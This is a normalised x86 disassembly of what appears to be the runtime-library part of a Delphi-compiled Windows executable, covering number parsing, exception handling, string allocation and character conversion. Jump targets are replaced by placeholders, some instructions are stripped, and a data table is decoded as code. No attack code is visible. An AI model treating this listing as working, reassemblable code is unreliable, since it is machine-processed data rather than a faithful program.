jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_4039ac
push ebx
mov ebx eax
movzx eax [ eax + 0x4 ]
sub eax 0xd7b2
cmp eax 0x1
ja r-xdata
mov eax 0x5
jmp r-xdata
push 0x0
mov eax esp
push 0x0
push eax
push [ ebx + 0x8 ]
push edx
push [ ebx ]
call sub_401278
pop edx
dec eax
jne r-xdata
call sub_402ea4
call sub_4012d8
cmp edx [ ebx + 0x8 ]
je r-xdata
mov eax ebx
pop ebx
retn
mov eax 0x65
jmp r-xdata
sub_403a00
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_403a40
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_403af3 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_403af3 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_403af3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_403d2c
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_403d5c
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_401340
test eax eax
jne r-xdata
movzx eax [ rw-data ]
and ax 0xffc0
movzx edx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403dcd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_401348
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_401338
retn
sub_403e58
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_403edf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax ebx
call sub_403e44
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4050a8
mov eax esi
call sub_405120
push eax
mov eax esi
call sub_405324
push eax
mov eax [ ebp - 0x4 ]
call sub_405120
push eax
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
push 0x1
push 0x800
call sub_401288
cmp eax 0x2
sete bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403ee6
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_403f70
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_403fc8
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_405aa4
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_403fe8
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_406b0c
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_404018
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_40409c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4040ac
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4040a3
lea eax [ ebp - 0x8 ]
call sub_406af4
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_403fe8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_406b0c
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4040ac
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4040f0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_404190
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_404130
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_404160
push eax
push ecx
mov eax [ eax ]
call sub_404130
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_404d84
call [ rw-data ]
sub_404178
push esi
mov esi edx
mov eax [ eax ]
call sub_404130
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_404d84
call [ rw-data ]
sub_4041c0
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_404130
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4041e8
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_404238
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_404288
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4042b1
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4042e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40430f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax [ ebp - 0x4 ]
pop [ fs : 0x0 ]
add esp 0x8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40435c
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_404398
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4043ac
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4043c0
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_4043e0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_4043c0
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_404444
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403e20
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_40710c
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_4043ac
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_40435c
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_404570
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403e20
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_40435c
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_40710c
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_404398
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_4036b8
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4046f8
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
push ebx
xor ebx ebx
push esi
push edi
push ebp
push ebp
push sub_404778
push [ fs : ebx ]
mov [ fs : ebx ] esp
mov ebx [ fs : ebx ]
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
push ebx
push eax
push edx
push ecx
mov edi [ esp + 0x34 ]
call sub_40710c
push [ eax ]
mov [ eax ] esp
mov ecx [ edi + 0x4 ]
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] sub_404778
add ecx 0x5
call sub_4043e0
call ecx
call sub_40710c
mov ecx [ eax ]
mov edx [ ecx ]
mov [ eax ] edx
add esp 0x14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_404778
jmp r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_4043e0
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_4047d8
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_404d84
sub_404800
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_40710c
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403f64
call sub_404340
sub_404854
call sub_40710c
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403f64
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_404408
jmp edx
sub_40489c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
movzx eax al
mov edx [ edx + 0xc ]
call sub_402e20
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_4049fc
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_404a24
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ rw-data ]
mov edi [ eax + 0x4 ]
xor eax eax
push ebp
push sub_404a6d
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ rw-data ] ebx
mov esi [ edi + ebx * 8 + 0x4 ]
test esi esi
je r-xdata
test ebx ebx
jg r-xdata
call esi
sub_404a88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov edi [ eax ]
xor ebx ebx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_404ad5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test esi esi
je r-xdata
cmp edi ebx
jg r-xdata
call esi
sub_404b30
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_406fd4
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_404b58
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_404b7c
push ebx
push esi
push edi
mov edi rw-data
mov bl 0x10
mov esi [ rw-data ]
mov eax esi
mov ecx 0xa
cdq
idiv ecx
add dl 0x30
movzx eax bl
mov [ edi + eax ] dl
mov ecx 0xa
mov eax esi
cdq
idiv ecx
mov esi eax
dec ebx
test esi esi
jne r-xdata
mov bl 0x1c
mov esi [ rw-data ]
mov eax esi
and eax 0xf
movzx eax [ eax + rw-data ]
movzx edx bl
mov [ edi + edx ] al
mov ecx 0x10
mov eax esi
xor edx edx
div ecx
mov esi eax
dec ebx
test esi esi
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_404be0
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_404c10
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_4012a8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_401240
push eax
call sub_401278
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_401240
push eax
call sub_401278
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_404c9c
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_404b7c
call sub_404c10
xor eax eax
mov [ rw-data ] eax
mov eax [ edi ]
mov esi eax
xor eax eax
mov [ edi ] eax
call esi
cmp [ edi ] 0x0
jne r-xdata
call sub_404a24
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebx + 0x10 ]
test edi edi
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_4049fc
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
mov eax edi
call sub_406a84
mov ebp [ ebx + 0x10 ]
mov esi [ ebp + 0x10 ]
cmp esi [ ebp + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test esi esi
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_404be0
push esi
call sub_4012c0
mov eax [ ebx ]
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call ExitProcess
call [ rw-data ]
sub_404d90
push ebp
mov ebp esp
call sub_403e20
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_402d44
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_404dc8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8
call sub_402d28
mov [ eax ] ebx
mov [ eax + 0x4 ] esi
mov edx esi
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_404d90
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call sub_401290
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_404e44
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_402d44
pop eax
sub_404e68
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402d44
sub_404e98
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404f08
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_402f9c
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402d44
sub_404edc
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402d44
sub_404f08
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_402d28
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404f34
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404f08
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_404e44
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_402f9c
sub_404f64
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404f84
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_404fa0
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
